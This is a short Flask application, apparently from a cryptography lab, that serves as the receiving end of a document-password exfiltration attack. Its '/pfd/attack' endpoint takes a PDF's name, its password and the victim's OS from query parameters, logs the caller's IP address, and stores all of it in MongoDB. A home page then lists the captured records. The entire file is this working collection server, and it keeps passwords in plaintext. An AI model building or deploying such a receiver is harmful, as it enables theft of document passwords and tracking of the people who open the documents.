from flask import Flask, jsonify, request, Response, render_template, redirect
from flask.helpers import url_for
from flask_pymongo import PyMongo
from werkzeug.security import generate_password_hash, check_password_hash


app = Flask(__name__, template_folder='templates')
app.config['MONGO_URI'] = 'mongodb://localhost/cripto-lab5'

mongo = PyMongo(app)

@app.route("/")
def home():
    pdf = mongo.db.pdf.find()
    return render_template("index.html", pdf=pdf)

@app.route('/pfd/attack', methods=['GET'])
def create_pdf():
    if request.method == 'GET':
        nombreDocumento = request.args.get('name')
        contrasenaDocumento = request.args.get('password')
        direccionIP = request.remote_addr
        sistemaOperativo = request.args.get('os')
        mongo.db.pdf.insert({'name':nombreDocumento,'password':contrasenaDocumento,'ip':direccionIP, 'so':sistemaOperativo})
        return redirect(url_for( "home"))
    else:
        return not_found()



@app.errorhandler(404)
def not_found(error=None):
    message = {
        'message': 'Resource Not Found ' + request.url,
        'status': 404
    }
    response = jsonify(message)
    response.status_code = 404
    return response


if __name__ == '__main__':
    app.run(debug=True, port=65000, host='192.168.0.4')
